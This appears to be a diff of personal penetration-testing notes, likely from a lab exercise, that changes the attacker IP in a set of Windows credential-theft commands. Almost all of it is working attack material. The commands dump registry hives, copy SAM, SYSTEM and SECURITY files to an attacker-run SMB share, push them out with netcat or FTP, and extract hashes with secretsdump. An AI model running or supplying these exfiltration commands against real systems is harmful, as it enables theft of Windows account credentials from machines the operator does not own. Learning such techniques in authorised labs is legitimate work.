@@ -13,14 +13,14 @@ for %F in ("C:\Windows\Repair" "C:\Windows\System32\config" "C:\Windows\System32
 ================================== 
 Favorite
 
+python3 smbserver.py share `pwd` -smb2support -username mike -password helps
 cd C:\Windows\Temp\
 cd C:\Users\Bob\Downloads\
-python3 smbserver.py share `pwd` -smb2support -username mike -password helps
-net use \\192.168.49.124\share /USER:mike helps
-copy *x \\192.168.49.124\share\  
-copy samx \\192.168.119.154\share\  
-copy systemx \\192.168.119.154\share\  
-copy securityx \\192.168.119.154\share\  
+net use \\192.168.162.46\share /USER:mike helps
+copy *x \\192.168.162.46\share\  
+copy samx \\192.168.162.46\share\  
+copy systemx \\192.168.162.46\share\  
+copy securityx \\192.168.162.46\share\  
 secretsdump -sam samx -system systemx LOCAL  
 
 
@@ -40,19 +40,19 @@ reg.exe save hklm\system systemx
 Upload to Kali
 
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support
-copy *x \\192.168.119.154\share\
-copy C:\Windows\Repair\SAM \\192.168.119.15\share\
-copy C:\Windows\Repair\SYSTEM \\192.168.119.15\share\
+copy *x \\192.168.162.46\share\
+copy C:\Windows\Repair\SAM \\192.168.162.46\share\
+copy C:\Windows\Repair\SYSTEM \\192.168.162.46\share\
 
 nc -nvlp 4444 > samx   
 nc -nvlp 4444 > systemx   
 nc -nvlp 4444 > securityx  
-nc.exe -nv 192.168.119.154 4444 < samx   
-nc.exe -nv 192.168.119.154 4444 < systemx  
-nc.exe -nv 192.168.119.154 4444 < securityx
+nc.exe -nv 192.168.162.46 4444 < samx   
+nc.exe -nv 192.168.162.46 4444 < systemx  
+nc.exe -nv 192.168.162.46 4444 < securityx
 
 Kali> sudo python3 -m pyftpdlib -p 21 -u mike -P helps -w  
-ftp 192.168.119.154  
+ftp 192.168.162.46
 mike  
 helps  
 PUT samx  
